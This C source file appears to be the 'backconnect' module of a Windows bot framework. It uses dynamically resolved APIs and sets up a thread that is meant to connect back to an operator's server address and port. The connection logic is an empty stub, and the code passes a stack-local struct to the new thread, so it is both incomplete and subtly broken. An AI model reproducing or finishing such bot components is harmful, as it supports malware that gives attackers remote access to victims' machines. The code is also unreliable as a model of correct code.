#include "backconnect.h"

#ifdef MODULE_BACKCONNECT
#include "mem.h"
#include "string.h"

extern bot_t bot;

static DWORD WINAPI Backconnect_Thread(backconnect_info_t* pBcInfo)
{
	WSADATA wsaData;

	if (bot.api.pWSAStartup(MAKEWORD(2, 2), &wsaData) == 0)
	{

		bot.api.pWSACleanup();
	}
	return 0;
}

BOOL WINAPI StartBackconnect(const LPSTR pszServerAddress, int iPort)
{
	HANDLE hThread;
	backconnect_info_t bcInfo;
	memzero(&bcInfo, sizeof(backconnect_info_t));
	bcInfo.pszServerAddress = StrCopyA(pszServerAddress, StrLengthA(pszServerAddress));
	bcInfo.iPort = iPort;

	if ((hThread = bot.api.pCreateThread(NULL, 0, Backconnect_Thread, &bcInfo, 0, NULL)) != 0)
	{
		bot.api.pCloseHandle(hThread);
		return TRUE;
	}

	memfree(bcInfo.pszServerAddress);

	return FALSE;
}
#endif